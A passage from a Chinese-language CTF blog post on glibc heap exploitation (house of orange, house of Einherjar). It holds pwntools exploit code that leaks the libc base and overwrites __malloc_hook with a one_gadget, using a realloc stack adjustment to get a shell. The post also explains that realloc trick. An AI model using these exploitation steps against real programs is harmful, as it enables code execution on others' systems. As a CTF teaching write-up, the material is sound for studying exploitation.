function_">add</span>(<span class="params">idx, size </span>):</span><br><span class="line">     choice(<span class="number">1</span>)</span><br><span class="line">     sla(<span class="string">&quot;ID: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">     sla(<span class="string">&quot;long: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">     choice(<span class="number">2</span>)</span><br><span class="line">     sla(<span class="string">&quot;show?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">     choice(<span class="number">3</span>)</span><br><span class="line">     sla(<span class="string">&quot;throw?\n&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content=<span class="string">&#x27;a&#x27;</span></span>):</span><br><span class="line">     choice(<span class="number">4</span>)</span><br><span class="line">     sla(<span class="string">&quot;write?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">     sla(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="comment"># house of orange泄露libc基地址</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x100</span>) <span class="comment"># 多次利用该chunk的size</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x18</span>)</span><br><span class="line">edit(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>,cyclic(<span class="number">0x18</span>) + p64(<span class="number">0xfe1</span>-<span class="number">0x110</span>)) <span class="comment"># 此时修改的size是由size[0]决定，也就是0x30</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x1000</span>) <span class="comment"># house of orange泄露libc</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x20</span>)</span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">ru(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>) + <span class="string">b&#x27;\x00\x00&#x27;</span>) - <span class="number">0x3c5188</span> <span class="comment"># 动调看固定偏移</span></span><br><span class="line">lg(<span class="string">&quot;libc.address: &quot;</span>,libc.address)</span><br><span class="line">ogg = [<span class="number">0x4527a</span> , <span class="number">0xf03a4</span> , <span class="number">0xf1247</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 其实可以直接打Arbitrary alloc</span></span><br><span class="line"><span class="comment"># 即使free之后将指针清零，但是我们还是可以通过堆溢出修改fastbin中chunk-&gt;fd</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x68</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">0</span>) <span class="comment"># 将下次edit的size控制为chunk[0]的size</span></span><br><span class="line">malloc_hook = libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">realloc = libc.sym[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">lg(<span class="string">&quot;malloc_hook: &quot;</span>,malloc_hook)</span><br><span class="line">lg(<span class="string">&quot;realloc: &quot;</span>,realloc)</span><br><span class="line"></span><br><span class="line">fake_chunk = malloc_hook - <span class="number">0x23</span></span><br><span class="line">payload = cyclic(<span class="number">0x20</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64(fake_chunk) <span class="comment"># 此时size为chunk[0]的size</span></span><br><span class="line">edit(<span class="number">3</span>,payload) <span class="comment"># 下一次edit就是chunk[3]的size，只有0x20</span></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x68</span>)</span><br><span class="line"><span class="comment"># bug()</span></span><br><span class="line">edit(<span class="number">0</span>) <span class="comment"># 下次又是chunk[0]的size了</span></span><br><span class="line">payload = cyclic(<span class="number">0xb</span>) + p64(ogg[<span class="number">0</span>] + libc.address) + p64(realloc+<span class="number">12</span>) <span class="comment"># 也要动态调试</span></span><br><span class="line">edit(<span class="number">6</span>,payload)</span><br><span class="line"></span><br><span class="line">choice(<span class="number">1</span>)</span><br><span class="line">sla(<span class="string">&quot;ID: &quot;</span>,<span class="built_in">str</span>(<span class="number">8</span>))</span><br><span class="line">sla(<span class="string">&quot;long: &quot;</span>,<span class="built_in">str</span>(<span class="number">0x100</span>))</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>这里简单说一下<code>realloc</code></li>
+</ul>
+<p>由于ogg的实现是有条件的，有时候我们直接修改malloc_hook为ogg有时候栈上的结构并不能满足ogg的要求，这时候我们就要修改realloc__hook为ogg，然后改malloc_hook为realloc+n。</p>
+<p>这样改的目的是在调用<code>malloc</code>的时候，会去调用<code>realloc</code>，然后<code>realloc</code>又会调用<code>realloc_hook</code>，再到ogg</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">malloc</span> -&gt; malloc_hook -&gt; <span class="built_in">realloc</span> -&gt; realloc_hook -&gt; ogg</span><br></pre></td></tr></table></figure></div>
+
+<p>至于为什么+n，我们来看看realloc函数：</p>
+<p><img lazyload src="/images/loading.svg" data-src="/../image-20250310201636721.png" alt="image-20250310201636721"></p>
+<p>可以发现，这里有很多push的操作，借用这些操作我们可以调整栈结构，找到合适的+n就可以满足ogg的条件，从而get shell，来看看实现吧</p>
+<ul>
+<li>malloc -&gt; malloc_hook -&gt; realloc</li>
+</ul>
+<p><img lazyload src="/images/loading.svg" data-src="/../image-20250310201855549.png" alt="image-20250310201855549"></p>
+<ul>
+<li>realloc-&gt;realloc_hook-&gt;ogg</li>
+</ul>
+<p>这里有一个rsp-0x38的操作，第一个ogg执行的条件是[rsp+0x30]&#x3D;NULL，看第二张图片，可以我们只要push一次，然后rsp-0x38就可以使得该条件成立，然后call rax执行ogg的时候就可以get shell了。</p>
+<p><img lazyload src="/images/loading.svg" data-src="/../image-20250310202329091.png" alt="image-20250310202329091"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/../image-20250310202358528.png" alt="image-20250310202358528"></p>
+<ul>
+<li>看看执行：</li>
+</ul>
+<p><img lazyload src="/images/loading.svg" data-src="/../image-20250310202643145.png" alt="image-20250310202643145"></p>
+<h2 id="house-of-Einherjar"><a href="#house-of-Einherjar" class="headerlink" title="house of Einherjar"></a>house of Einherjar</h2><ul>
+<li>就简单讲一下泄露libc的方法吧，后面的攻击手法还是一样的，Arbitrary_alloc+realloc调整</li>
+</ul>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0xf0</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0xf0</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x68</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x60</span>) + p64(<span class="number">0x170</span>) + p64(<span class="number">0x100</span>) </span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>) <span class="comment"># house of einherjar，会合并前面的chunk</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0xf0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">main_arena = l64() - <span class="number">0x58</span></span><br><span class="line">malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">libc.address = malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">lg(<span class="string">&quot;libc.address: &quot;</span>,libc.address)</span><br></pre></td></tr></table></figure></div>
+
+<p>如上面所示，申请四个chunk，第四个防止合并top chunk，用chunk2来向下合并，chunk1来泄露libc。</p>
+<p>原理其实是堆堆叠，正常溢出修改prev_size为前两个chunk size的和，然后修改size的p位即可，由于用 off by one的时候会造成换行符的覆盖，所以就没用off by one了。</p>
+<p>然后free(2)就会使得chunk2向下合并，再次malloc(chunk0-&gt;size)，那么原先chunk1的user_data就会有着main_arena+88，然后直接show出来即可，就获得libc了</p>
+<blockquote>
+<p>这种方法比较巧妙，也算是house of Einherjar的利用，但是由于题目比较简单，因此方法挺多的，就不多赘述了</p>
+</blockquote>
+<p>​	</p>
+
+        </div>
+
+        
+            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>标题:</strong> House_of_Einherjar</li>
+        <li><strong>作者:</strong> D0wnBe@t</li>
+        <li><strong>创建于
+                :</strong> 2025-03-10 19:35:01</li>
+        
+            <li>
+                <strong>更新于
+                    :</strong> 2025-03-10 21:35:48
+            </li>
+        
+        <li>
+            <strong>链接:</strong> http://downbeat.top/2025/03/10/House-of-Einherjar/
+        </li>
+        <li>
+            <strong>
+                版权声明:
+            </strong>
+            
+
+            
+                本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a> 进行许可。
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/pwn/">#pwn</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/House-of-Einherjar/">#House_of_Einherjar</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2025/03/09/2023ciscn-PWN%E5%A4%8D%E7%8E%B0-1/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">2023ciscn-PWN复现</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+                <div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        评论
+    </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '/js/libs/waline.mjs';
+
+      function loadWaline() {
+        init({
+          el: '#waline',
+          serverURL: 'https://waline.downbeat.top/',
+          lang: 'zh-CN',
+          dark: 'body[class~="dark-mode"]',
+          reaction: true,
+          requiredMeta: ['nick', 'mail'],
+          emoji: ['https://unpkg.com/@waline/emojis@1.2.0/qq','https://unpkg.com/@waline/emojis@1.2.0/weibo'],
+          
+          
+        });
+      }
+
+      if (typeof swup !== 'undefined') {
+        loadWaline();
+      } else {
+        window.addEventListener('DOMContentLoaded', loadWaline);
+      }
+    </script>
+
+
+
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">目录</div>
+        <div class="page-title">House_of_Einherjar</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E5%BC%95"><span class="nav-text">前引</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98"><span class="nav-text">例题</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#house-of-orange"><span class="nav-text">house of orange</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#EXP"><span class="nav-text">EXP</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#house-of-Einherjar"><span class="nav-text">house of Einherjar</span></a></li></ol></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2024</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">D0wnBe@t</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        共撰写了 49 篇文章
+                    </span>
+                    
+                        <span>
+                            共 65.4k 字
+                        </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">访问人数</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">总访问量</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a> 驱动</span>
+            <span class="text-sm lg:block">主题&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.7.3</a></span>
+        </div>
+        
+        
+            <div>
+                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fa-regular fa-comments"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fa-solid fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="站内搜索您需要的内容..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fa-solid fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+    <script  src="https://evan.beee.top/projects/hexo-theme-redefine@2.7.3/source/js/libs/Swup.min.js" ></script><script  src="https://evan.beee.top/projects/hexo-theme-redefine@2.7.3/source/js/libs/SwupSlideTheme.min.js" ></script><script  src="https://evan.beee.top/projects/hexo-theme-redefine@2.7.3/source/js/libs/SwupScriptsPlugin.min.js" ></script><script  src="https://evan.beee.top/projects/hexo-theme-redefine@2.7.3/source/js/libs/SwupProgressPlugin.min.js" ></script><script  src="https://evan.beee.top/projects/hexo-theme-redefine@2.7.3/source/js/libs/SwupScrollPlugin.min.js" ></script><script  src="https://evan.beee.top/projects/hexo-theme-redefine@2.7.3/source/js/libs/SwupPreloadPlugin.min.js" ></script>
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+<script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.7.3/source/js/tools/imageViewer.js" ></script><script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.7.3/source/js/utils.js" ></script><script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.7.3/source/js/main.js" ></script><script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.7.3/source/js/layouts/navbarShrink.js" ></script><script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.7.3/source/js/tools/scrollTopBottom.js" ></script><script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.7.3/source/js/tools/lightDarkSwitch.js" ></script><script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.7.3/source/js/layouts/categoryList.js" ></script>
+
+
+    <script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.7.3/source/js/tools/localSearch.js" ></script>
+
+
+
+    <script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.7.3/source/js/tools/codeBlock.js" ></script>
+
+
+
+    <script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.7.3/source/js/layouts/lazyload.js" ></script>
+
+
+
+    <script  src="https://evan.beee.top/projects/hexo-theme-redefine@2.7.3/source/js/tools/runtime.js" ></script>
+    <script  src="https://evan.beee.top/projects/hexo-theme-redefine@2.7.3/source/js/libs/odometer.min.js" ></script>
+    <link rel="stylesheet" href="https://evan.beee.top/projects/hexo-theme-redefine@2.7.3/source/assets/odometer-theme-minimal.css">
+
+
+
+  <script  src="https://evan.beee.top/projects/hexo-theme-redefine@2.7.3/source/js/libs/Typed.min.js" ></script>
+  <script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.7.3/source/js/plugins/typed.js" ></script>
+
+
+
+
+
+
+
+    <script  src="https://evan.beee.top/projects/hexo-theme-redefine@2.7.3/source/js/libs/anime.min.js" ></script>
+
+
+
+
+    <script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.7.3/source/js/tools/tocToggle.js" data-swup-reload-script></script><script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.7.3/source/js/layouts/toc.js" data-swup-reload-script></script><script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.7.3/source/js/plugins/tabs.js" data-swup-reload-script></script>
+
+
+<script  src="https://evan.beee.top/projects/hexo-theme-redefine@2.7.3/source/js/libs/moment-with-locales.min.js" data-swup-reload-script></script>
+<script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.7.3/source/js/layouts/essays.js" data-swup-reload-script></script>
+
+
+
+</body>
+</html>
